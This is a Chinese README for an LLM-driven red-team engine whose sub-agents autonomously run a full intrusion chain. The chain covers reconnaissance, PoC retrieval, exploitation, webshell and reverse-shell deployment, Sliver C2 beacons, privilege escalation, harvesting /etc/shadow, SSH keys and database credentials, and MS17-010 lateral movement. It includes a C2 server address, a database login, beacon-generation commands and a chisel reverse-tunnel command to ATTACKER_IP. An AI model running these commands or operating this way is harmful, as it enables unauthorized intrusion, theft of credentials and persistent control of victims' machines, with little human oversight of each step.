# OVOGOGOGO — 红队渗透自动化引擎

> 最后更新：2026-04-09 | 状态：生产可用

---

## 一、项目定位

**ovogogogo** 是一个基于大语言模型的红队渗透测试自动化引擎，将完整攻击链（外网侦察 → 漏洞利用 → C2 部署 → 内网横移）全部自动化。

| 项目 | 内容 |
|------|------|
| API 接口 | OpenAI 兼容格式（非 Anthropic SDK），支持任意兼容端点 |
| 运行环境 | 64 核 Linux 云服务器，`/project/ovogogogo/` |
| 测试目标 | `zhhovo.top`（授权测试靶场） |
| PoC 数据库 | 22 万条 Nuclei PoC（pgvector + BGE-M3 嵌入，`/data/poc_db/`） |
| C2 框架 | Sliver v1.7.3（`/opt/sliver-client_linux`，测试服务器 ``） |
| 内网穿透 | chisel（`/usr/local/bin/chisel`）+ proxychains |

---

## 二、AI / LLM 技术体系

本项目综合运用了多种 LLM 工程技术：

### 2.1 ReAct — Think-Act-Observe 主循环

引擎核心遵循 ReAct 模式（Reasoning + Acting）：

```
while iterations < maxIterations:
    response = LLM(systemPrompt + history)   // Think
    if response.tool_calls:
        results = execute(tool_calls)        // Act
        history.push(results)                // Observe
    else:
        return response.text                 // 最终答案
```

LLM 在每轮自主决定：调用哪些工具、以什么顺序、携带什么参数，形成完整的规划-执行-观察闭环。

### 2.2 OpenAI Function Calling（结构化工具调用）

工具描述以 JSON Schema 格式注入到 API 请求中，LLM 返回结构化 `tool_calls` 数组。引擎解析后分发到对应工具实现：

```typescript
// 每个工具实现 ToolDefinition（JSON Schema 描述）+ execute() 方法
class BashTool implements Tool {
  definition: ToolDefinition = { type: 'function', function: { name: 'Bash', ... } }
  async execute(input, context): Promise<ToolResult> { ... }
}
```

当前注册工具共 14 个，覆盖文件操作、Shell 执行、网络请求、漏洞记录、武器库检索、多智能体调度等。

### 2.3 Streaming（流式输出）

使用 OpenAI SSE 流式接口，LLM 输出实时渲染到终端：

```typescript
const stream = await client.chat.completions.create({ stream: true, ... })
for await (const chunk of stream) {
    process.stdout.write(chunk.choices[0].delta.content ?? '')
}
```

用户实时看到 LLM 的推理过程，工具调用完成后立即显示结果。

### 2.4 Multi-Agent 多智能体并行架构

核心并发机制：同一 LLM 响应中的多个 `Agent` 工具调用通过 `Promise.all` 同时执行。

```typescript
// CONCURRENCY_SAFE_TOOLS — 这些工具在同一响应中并行执行
const CONCURRENCY_SAFE_TOOLS = new Set([
  'Bash', 'Agent', 'WeaponRadar', 'FindingList',
  'Read', 'Glob', 'Grep', 'WebFetch', 'WebSearch',
])

// partitionToolCalls — 安全工具并行，其余串行
const [safe, serial] = partitionToolCalls(calls)
await Promise.all(safe.map(execute))   // 并行
for (const call of serial) await execute(call)  // 串行
```

Orchestrator（主引擎）在一次响应中调用 3 个 `Agent(...)` → 3 个 sub-agent 同时跑，64 核服务器支持 50+ 并发。

每个 sub-agent 是完整的引擎实例（独立系统 Prompt、独立工具集、独立对话历史），专用于特定任务。

### 2.5 RAG — 检索增强生成（武器库）

WeaponRadar 工具集成了向量数据库语义检索：

```
用户任务描述
    ↓
BGE-M3 嵌入（sentence-transformers，768 维）
    ↓
pgvector 余弦相似度检索（22万条 Nuclei PoC）
    ↓
TOP-K 相关 PoC（含完整 YAML 代码 + CVE + 参数说明）
    ↓
注入到 LLM 上下文 → 直接生成 nuclei 执行命令
```

批量查询模式（`queries: []`）只加载一次 BGE-M3 模型（~60s），处理多个查询，大幅减少等待时间。

### 2.6 技能系统（动态上下文注入）

`.ovogo/skills/*.md` 文件是动态加载的"工具手册"，用户调用 `/skill-name` 时自动注入到对话上下文，相当于 Few-Shot Prompt：

```
技能文件 → 解析 YAML frontmatter → 替换 $ARGS → 注入系统上下文
```

当前共 51 个技能文件，覆盖所有渗透工具的最佳实践（包含正确路径、并发参数、常见坑点）。

### 2.7 Auto-Compact（上下文自动压缩）

对话历史超过 token 阈值时，引擎自动调用 LLM 对历史进行摘要压缩，保留关键发现，丢弃冗余工具输出：

```typescript
if (tokenCount > COMPACT_THRESHOLD) {
    const summary = await llm.summarize(history)
    history = [systemMessage, summaryMessage]
}
```

支持长时间、多阶段渗透任务而不中断。

### 2.8 专用 System Prompt（角色专业化）

每种 Agent 类型有独立的、高度专业化的系统 Prompt（`src/prompts/agentPrompts.ts`），包含：

- 精确的工具调用规范（防止 nmap/nuclei/httpx 常见错误）
- 64 核并发参数（`-c 100 -bs 50 -rl 500`，`-t 300` 等）
- 输出文件路径规范
- 特定任务的决策树（如 exploit agent 的 RCE → webshell → C2 链路）

---

## 三、系统架构

### 3.1 整体结构

```
┌──────────────────────────────────────────────────────────────┐
│                     OVOGOGOGO 引擎                            │
│                                                              │
│  ┌─────────────┐    ┌──────────────┐    ┌────────────────┐  │
│  │  CLI 入口    │    │   主引擎      │    │  工具注册表     │  │
│  │ ovogogogo.ts│───▶│  engine.ts   │───▶│   index.ts     │  │
│  └─────────────┘    │ ReAct 主循环  │    │ 14个工具        │  │
│                     └──────┬───────┘    └────────────────┘  │
│                            │                                 │
│              ┌─────────────┼─────────────┐                  │
│              ▼             ▼             ▼                   │
│       ┌──────────┐  ┌──────────┐  ┌──────────────┐         │
│       │  Prompt   │  │  Tools   │  │    Config    │         │
│       │ system.ts │  │ bash.ts  │  │ settings.ts  │         │
│       │ agent     │  │ agent.ts │  │ .ovogo/      │         │
│       │ Prompts.ts│  │ weapon   │  │ settings.json│         │
│       └──────────┘  │ Radar.ts │  └──────────────┘         │
│                     └──────────┘                            │
└──────────────────────────────────────────────────────────────┘
                            │
              ┌─────────────▼──────────────┐
              │      外部基础设施            │
              │  PostgreSQL+pgvector        │
              │  22万条 Nuclei PoC          │
              │  BGE-M3 嵌入模型            │
              │  Sliver C2 () │
              │  chisel + proxychains       │
              └────────────────────────────┘
```

### 3.2 引擎核心参数

| 参数 | 值 | 说明 |
|------|----|------|
| `DEFAULT_TIMEOUT_MS` | 1,800,000 (30min) | Bash 默认超时 |
| `MAX_TIMEOUT_MS` | 14,400,000 (4h) | Bash 最大超时 |
| `maxIterations` | 200 | 主引擎最大轮次 |
| `MAX_TOOL_RESULT_LENGTH` | 20,000 | 工具输出截断长度 |

---

## 四、多智能体架构（17 种专用 Agent）

```
Orchestrator (主引擎, 200轮上限)
│
│  ◀── 同一响应中多个 Agent() 调用 = Promise.all 并行 ──▶
│
├─ Phase 1: RECON（3个Agent同时运行）
│   ├─ dns-recon    (80轮)  subfinder/dnsx/amass
│   │                       → subs.txt / ips.txt / dns_records.txt
│   ├─ port-scan    (80轮)  nmap两步后台/masscan/naabu
│   │                       → nmap_ports.txt / nmap_services.txt
│   └─ web-probe    (80轮)  httpx(-t 300 -timeout 10)/katana/gau
│                           → web_assets.txt / katana_urls.txt
│
├─ Phase 2: INTEL（2个Agent同时运行）
│   ├─ weapon-match (60轮)  WeaponRadar 批量查询（一次模型加载）
│   │                       → pocs/*.yaml（可直接用 nuclei 执行）
│   └─ osint        (60轮)  WebSearch/crt.sh/GitHub dork/证书透明度
│                           → osint_findings.txt
│
├─ Phase 3: SCAN（3个Agent同时运行）
│   ├─ web-vuln    (120轮)  nuclei(-c 100 -bs 50 -rl 500)/ffuf(-t 200)/nikto
│   │                       → nuclei_web.txt / ffuf_dirs.json
│   ├─ service-vuln(100轮)  nuclei 网络层/nmap-vuln/enum4linux/SMB
│   │                       → nuclei_network.txt / service_vulns.txt
│   └─ auth-attack (100轮)  hydra/kerbrute/netexec 默认凭证检测
│                           → hydra_results.txt / valid_creds.txt
│
├─ Phase 4: EXPLOIT（每高置信漏洞1个Agent）
│   ├─ poc-verify × N (60轮)  运行PoC + 证据收集 + FindingWrite
│   │                          → evidence/CVE-XXXX_proof.txt
│   ├─ exploit      (100轮)  RCE→反弹Shell→稳定化，上传webshell/工具
│   │                         → shell_access.txt / exploit_notes.txt
│   └─ webshell     (80轮)   PHP/JSP/ASPX webshell部署，命令执行验证
│                             → webshell_url.txt / webshell_cmds.txt
│
├─ Phase 5: POST-EXPLOIT（3个Agent同时运行）
│   ├─ post-exploit  (80轮)  凭证收集/内网信息/敏感文件/hash dump
│   │                         → loot/passwords.txt / loot/hashes.txt
│   ├─ privesc      (100轮)  SUID/sudo/内核/cron提权，linpeas辅助
│   │                         → root_shell.txt / privesc_path.txt
│   └─ c2-deploy     (80轮)  Sliver beacon生成/上传/执行/等待上线
│                             → beacon_active.txt / c2_session.txt
│
├─ Phase 6: LATERAL（3个Agent同时运行）
│   ├─ tunnel       (80轮)   chisel反向SOCKS5代理，proxychains配置
│   │                         → socks5_active.txt
│   ├─ internal-recon(100轮) proxychains+nmap/httpx 内网资产发现
│   │                         → internal_hosts.txt / internal_web.txt
│   └─ lateral      (120轮)  MS17-010/PTH/凭证复用/SSH横向移动
│                             → lateral_access.txt / new_shells.txt
│
└─ Phase 7: REPORT（1个Agent）
    └─ report (60轮)  FindingList + 所有证据 → 完整渗透测试报告
                       → report.md
```

---

## 五、工具清单（14个）

| 工具 | 并发安全 | 说明 |
|------|---------|------|
| `Bash` | ✅ | Shell 命令，30min 默认超时，支持 run_in_background |
| `Agent` | ✅ | 专用红队 sub-agent，Promise.all 并行 |
| `WeaponRadar` | ✅ | 22W PoC 语义检索，queries[] 批量，默认返回 PoC 代码 |
| `Read` | ✅ | 文件读取 |
| `Write` | ❌ | 文件写入（串行） |
| `Edit` | ❌ | 文件编辑（串行） |
| `Glob` | ✅ | 文件路径匹配 |
| `Grep` | ✅ | 内容搜索 |
| `WebFetch` | ✅ | HTTP 请求（OSINT/CVE 查询） |
| `WebSearch` | ✅ | 网络搜索 |
| `FindingWrite` | ❌ | 写漏洞记录到 `.ovogo/findings/` |
| `FindingList` | ✅ | 读漏洞记录，支持过滤 |
| `MultiScan` | ✅ | Promise.all(wait) / nohup(detach) 两种模式 |
| `TodoWrite` | ❌ | 任务分解跟踪 |

---

## 六、武器库（WeaponRadar RAG）

### 数据库

| 项目 | 内容 |
|------|------|
| 数据库 | PostgreSQL 127.0.0.1:5432，用户/密码 `msf/msf`，库名 `msf` |
| 表名 | `nuclei_exploits` |
| 数据量 | 22 万条，全部含 `full_poc_code` |
| 向量索引 | HNSW（`poc_vector vector_cosine_ops`） |
| 嵌入模型 | BGE-M3（768 维，sentence-transformers） |
| 字段 | `id / module_name / full_poc_code / ai_analysis / cve_list / required_options / poc_vector` |

### 查询接口

```bash
# 单查询（默认返回完整PoC代码）
python3 /data/poc_db/weapon_radar_query.py -q "Apache Shiro 反序列化" -n 3

# 批量查询（一次加载模型，处理多个查询）
python3 /data/poc_db/weapon_radar_query.py \
  --batch-json '[{"query":"WordPress RCE","top_k":3},{"query":"Log4j","top_k":3}]'

# 不要PoC代码（只看匹配结果）
python3 /data/poc_db/weapon_radar_query.py -q "SSRF" --no-code
```

### WeaponRadar 工具用法

```
WeaponRadar({queries: ["Apache Log4j RCE", "Shiro 反序列化", "Jenkins RCE"]})
// 批量模式，模型只加载一次
// 返回：完整PoC YAML + nuclei 执行命令 + CVE列表 + 风险级别
```

---

## 七、技能系统（Skills）

`.ovogo/skills/*.md` — 51 个工具技能文件，动态注入到 Agent 上下文：

| 类别 | 技能文件 |
|------|---------|
| 侦察 | `subfinder.md` `dnsx.md` `httpx.md` `katana.md` `nmap.md` `masscan.md` `naabu.md` |
| 漏洞扫描 | `nuclei.md` `nikto.md` `ffuf.md` `wpscan.md` |
| 漏洞利用 | `sqlmap.md` `webshell.md` `revshell.md` |
| 认证攻击 | `hydra.md` `kerbrute.md` `netexec.md` `enum4linux.md` |
| 后渗透 | `privesc-linux.md` `pivoting.md` |
| C2 / 控制 | `sliver.md` `chisel.md` |
| OSINT | `amass.md` `shodan.md` |
| 其他 | `... (共51个)` |

每个技能文件包含：正确命令路径、64 核最优并发参数、常见错误规避、与其他工具的配合示例。

---

## 八、C2 与内网基础设施

### Sliver C2

| 项目 | 内容 |
|------|------|
| 客户端 | `/opt/sliver-client_linux` |
| 配置文件 | `/root/.sliver-client/configs/ningbo-ai-v2_148.135.88.219.cfg` |
| C2 服务器 | `` |
| 版本 | v1.7.3 |
| 调用方式 | RC 脚本非交互模式 `/opt/sliver-client_linux --rc /tmp/script.rc` |

```bash
# 生成 Linux Beacon
generate beacon --http http://:80 --os linux --arch amd64 --save /tmp/

# 查看上线会话
sessions

# 在 Session 执行命令
use SESSION_ID && shell -y
```

### chisel 内网穿透

```bash
# 攻击机（监听）
/usr/local/bin/chisel server -p 8888 --reverse

# 目标机（反向连接）
./chisel client ATTACKER_IP:8888 R:socks

# proxychains 配置
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains4 nmap -sV -p 22,80,443 INTERNAL_HOST
```

---

## 九、工具并发配置（64核标准）

| 工具 | 关键参数 | 说明 |
|------|---------|------|
| nuclei | `-c 100 -bs 50 -rl 500` | 模板并发100/目标并发50/500RPS |
| ffuf | `-t 200` | 200线程 |
| httpx | `-t 300 -timeout 10` | 300线程/每请求10s超时 |
| subfinder | `-t 100` | 100线程 |
| dnsx | `-t 200` | 200线程 |
| naabu | `-rate 10000` | 1万包/秒 |
| nmap | `-T4 --min-rate 5000` | 高速，**全端口扫必须后台运行** |
| katana | `-d 2 -timeout 30` | 深度2层，30s超时 |

---

## 十、目录结构

```
/project/ovogogogo/
├── README.md                  # 本文件
├── ovogo_progress.json        # 当前会话状态
├── resume.cfg                 # 恢复配置
├── package.json / tsconfig.json
│
├── bin/
│   └── ovogogogo.ts           # CLI 入口（主引擎初始化）
│
├── src/
│   ├── core/
│   │   ├── engine.ts          # Think-Act-Observe 主循环 + 并发调度
│   │   ├── types.ts           # 核心类型（EngineConfig + Tool 接口）
│   │   └── compact.ts         # 上下文自动压缩
│   │
│   ├── tools/
│   │   ├── index.ts           # 工具注册表（14个工具）
│   │   ├── agent.ts           # AgentTool（17种专用类型，最高200轮）
│   │   ├── bash.ts            # BashTool（30min默认超时）
│   │   ├── weaponRadar.ts     # WeaponRadar（22W PoC，批量查询，RAG）
│   │   ├── multiScan.ts       # MultiScan（Promise.all / nohup两模式）
│   │   ├── finding.ts         # FindingWrite / FindingList
│   │   ├── fileRead.ts / fileWrite.ts / fileEdit.ts
│   │   ├── glob.ts / grep.ts
│   │   ├── todo.ts
│   │   └── webFetch.ts / webSearch.ts
│   │
│   ├── prompts/
│   │   ├── system.ts          # 主引擎 System Prompt
│   │   ├── agentPrompts.ts    # 17种红队Agent专用Prompt
│   │   └── tools.ts           # 工具描述
│   │
│   ├── config/
│   │   └── settings.ts        # EngagementScope + OvogoSettings
│   │
│   └── ui/
│       └── renderer.ts        # TUI（spinner/工具展示/颜色）
│
├── .ovogo/
│   ├── settings.json          # Engagement配置（目标范围/阶段/日期）
│   ├── findings/              # 漏洞记录（f001.json / f002.json ...）
│   └── skills/                # 51个工具技能文档
│
├── sessions/                  # 渗透会话输出（每次自动创建）
│   └── session_TARGET_YYYYMMDD_HHMMSS/
│       ├── subs.txt / ips.txt / nmap_ports.txt
│       ├── web_assets.txt / nuclei_web.txt
│       ├── pocs/              # 匹配到的PoC YAML
│       ├── loot/              # 凭证/哈希/敏感文件
│       ├── evidence/          # 漏洞证据截图/响应
│       └── report.md          # 最终报告
│
└── /data/poc_db/              # 武器库（独立目录）
    ├── weapon_radar.py        # 核心引擎（BGE-M3向量+pgvector）
    └── weapon_radar_query.py  # JSON接口（供 WeaponRadar 工具调用）
```

---

## 十一、Engagement 配置

```json
// .ovogo/settings.json
{
  "engagement": {
    "name": "ZhhovoTop 外网渗透 2026-Q2",
    "phase": "recon",
    "targets": ["zhhovo.top"],
    "out_of_scope": [],
    "start_date": "2026-04-09",
    "end_date": "2026-04-30"
  }
}
```

---

## 十二、典型攻击链（完整流程）

```
用户: 对 zhhovo.top 进行全面渗透测试

Orchestrator:
  1. 读取 .ovogo/settings.json 确认授权范围
  2. 创建 sessions/session_zhhovo.top_YYYYMMDD_HHMMSS/

  ── Phase 1: 侦察（3个Agent同时） ─────────────────────────
  Agent(dns-recon)   → 发现 52 个子域名
  Agent(port-scan)   → 发现开放端口（80/443/8080/22/3306）
  Agent(web-probe)   → 发现 18 个活跃 Web 服务

  ── Phase 2: 情报（2个Agent同时） ─────────────────────────
  Agent(weapon-match) → WeaponRadar 匹配到 Apache Shiro/Struts2 PoC
  Agent(osint)        → GitHub 发现泄露的 API key

  ── Phase 3: 扫描（3个Agent同时） ─────────────────────────
  Agent(web-vuln)    → nuclei 发现 CVE-2023-46604 (ActiveMQ RCE)
  Agent(service-vuln)→ 发现 Redis 未授权访问
  Agent(auth-attack) → admin:admin123 密码爆破成功

  ── Phase 4: 利用 ─────────────────────────────────────────
  Agent(poc-verify)  → ActiveMQ RCE PoC 验证成功 → FindingWrite
  Agent(exploit)     → 反弹 Shell → 上传 chisel + beacon
  Agent(webshell)    → 部署 PHP webshell 作为持久化通道

  ── Phase 5: 后渗透（3个Agent同时） ───────────────────────
  Agent(post-exploit) → /etc/shadow / 数据库凭证 / SSH私钥
  Agent(privesc)      → sudo CVE-2023-22809 提权到 root
  Agent(c2-deploy)    → Sliver beacon 上线 148.135.88.219

  ── Phase 6: 内网横移（3个Agent同时） ─────────────────────
  Agent(tunnel)          → chisel SOCKS5 代理建立
  Agent(internal-recon)  → 发现内网 192.168.1.0/24，17台主机
  Agent(lateral)         → MS17-010 拿下 192.168.1.15

  ── Phase 7: 报告 ──────────────────────────────────────────
  Agent(report)      → 生成完整渗透测试报告（report.md）
```

---

## 十三、启动命令

```bash
cd /project/ovogogogo

# 编译
npm run build

# 运行
node dist/bin/ovogogogo.js

# 或 npm script
npm start

# 关键环境变量
export OPENAI_BASE_URL=http://...   # 自定义 API 端点
export OPENAI_API_KEY=xxx           # API 密钥
```

---

## 十四、已解决的关键问题

| 问题 | 解决方案 |
|------|---------|
| nmap -p- 超时 | `run_in_background: true` + 轮询 tail |
| httpx 挂死 | 加 `-timeout 10`（每请求超时） |
| nuclei "无模板"报错 | 必须加 `-t /root/nuclei-templates/` 或 `-id CVE-xxx` |
| WeaponRadar 双重模型加载 | `queries:[]` 批量模式，一次加载 |
| httpx vs Python httpx 冲突 | 强制绝对路径 `/root/go/bin/httpx` |
| katana 挂死 | 强制 `-d 2 -timeout 30` |
| Agent max_iterations 不足 | 各 Agent 80-120 轮，上限 200 |
| WeaponRadar stdout 污染 | `redirect_stdout(devnull)` 模型加载期间 |
| ffuf 字典路径错误 | `/opt/wordlists/seclists/` 绝对路径 |
